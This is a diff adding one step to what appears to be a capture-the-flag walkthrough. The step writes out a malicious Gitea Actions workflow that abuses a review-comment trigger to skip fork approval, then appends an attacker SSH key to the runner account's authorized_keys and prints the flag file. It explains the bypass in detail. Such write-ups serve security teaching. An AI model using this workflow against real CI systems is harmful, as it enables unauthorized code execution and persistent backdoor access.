@@ -2774,6 +2774,103 @@ josh@SRV01:~$
 <div align="center">
 <br>
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### Clean. Public key is intact on the `echo` line, indentation is correct, and the heredoc closed properly. Ready to upload.
+
+---
+
+#### 3.21 — Author the malicious workflow
+
+**Why this step:** The fork is writable, but a workflow matching the upstream `on: [push, pull_request]` trigger would be held for maintainer approval when raised as a PR from a fork. A different trigger — `pull_request_review_comment` — causes Gitea 1.25's notifier to omit the PR context, preventing fork detection and bypassing the approval gate entirely while still dispatching to the upstream runner.
+
+**Command:**
+
+bash
+
+```bash
+cat > /tmp/foothold.yml << 'EOF'
+name: foothold
+on:
+  pull_request_review_comment:
+    types: [created]
+jobs:
+  foothold:
+    runs-on: ubuntu
+    steps:
+      - run: |
+          install -d -m 700 /home/svc-runner/.ssh
+          echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB4JeeNtVvz6vDoebjRpOSb21QjhLXQ0ZIiuFXprFckD ci' >> /home/svc-runner/.ssh/authorized_keys
+          chmod 600 /home/svc-runner/.ssh/authorized_keys
+          id
+          cat /home/svc-runner/user.txt
+EOF
+```
+
+**Breakdown:**
+
+|Component|Purpose|Simple Explanation|
+|---|---|---|
+|`cat > /tmp/foothold.yml << 'EOF'`|Heredoc write — single-quoted delimiter prevents expansion|Write the file exactly as typed|
+|`on: pull_request_review_comment`|The bypass trigger|The event that skips fork detection|
+|`types: [created]`|Fire on new review comments only|Avoids repeat execution on edits|
+|`runs-on: ubuntu`|Target the self-hosted runner|Must match the runner's configured label|
+|`install -d -m 700 /home/svc-runner/.ssh`|Create `.ssh` directory with correct permissions|`install` creates and sets mode atomically|
+|`echo '...' >> authorized_keys`|Append the public key|Grants SSH access with the generated key|
+|`chmod 600 authorized_keys`|Set file permissions required by sshd|SSH refuses keys in files with loose permissions|
+|`id`|Print current identity|Confirms execution as `svc-runner`|
+|`cat /home/svc-runner/user.txt`|Print the user flag|The flag lives in `svc-runner`'s home directory|
+
+The single-quoted `'EOF'` is essential — without quotes, bash would expand `$` characters inside the heredoc, corrupting the `authorized_keys` content and breaking authentication.
+
+**Result:**
+
+yaml
+
+```yaml
+name: foothold
+on:
+  pull_request_review_comment:
+    types: [created]
+jobs:
+  foothold:
+    runs-on: ubuntu
+    steps:
+      - run: |
+          install -d -m 700 /home/svc-runner/.ssh
+          echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB4JeeNtVvz6vDoebjRpOSb21QjhLXQ0ZIiuFXprFckD ci' >> /home/svc-runner/.ssh/authorized_keys
+          chmod 600 /home/svc-runner/.ssh/authorized_keys
+          id
+          cat /home/svc-runner/user.txt
+```
+
+**What this gives you:** A workflow that bypasses the fork approval gate and installs persistent SSH access as the runner account.
+
+**Key findings:**
+
+- The `pull_request_review_comment` trigger is the vulnerability. Gitea 1.25's notifier for this event omits PR context, so the run is classified as non-forked and dispatched without approval. The upstream workflow's `pull_request` trigger would be held pending maintainer approval from a fork; this trigger is not.
+- `install -d -m 700` is preferred over `mkdir -p && chmod` because it creates the directory and sets permissions atomically, avoiding a window where the directory exists with wrong permissions.
+- Both `id` and `cat user.txt` are in the payload so the runner's job log confirms execution identity and delivers the flag in one shot.
+- The heredoc delimiter is single-quoted (`'EOF'`) to suppress shell expansion inside the document. An unquoted `EOF` would cause bash to expand the public key's `$` characters before writing the file.
+
+##### 3.21.1 Theory — Why `pull_request_review_comment` bypasses the approval gate
+
+Gitea protects against malicious pull requests from forks by requiring maintainer approval before running workflows on untrusted code. The protection works by inspecting the event context: if a workflow run originates from a fork, flag it for approval.
+
+That inspection depends on the event object carrying pull request context — specifically, a field indicating which repository the PR head comes from. When the notifier for `pull_request_review_comment` constructs its event object in Gitea 1.25, it omits that field. No PR context means no fork detection. No fork detection means no approval gate. The run is queued as if it came from the repository itself and dispatched immediately to the runner.
+
+The runner itself cannot distinguish a legitimate job from this one — it receives a signed dispatch from the Gitea instance it trusts and executes it. The failure is entirely in the gate logic, not in the runner.
+
+This is CVE-2026-22555, a logic flaw in the workflow dispatch path rather than a memory corruption or injection issue. It requires only: read access to a repository with Actions enabled, the ability to fork, and a self-hosted runner. All three are present here.
+
+**Next:** Upload the workflow to the fork via the Gitea contents API.
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
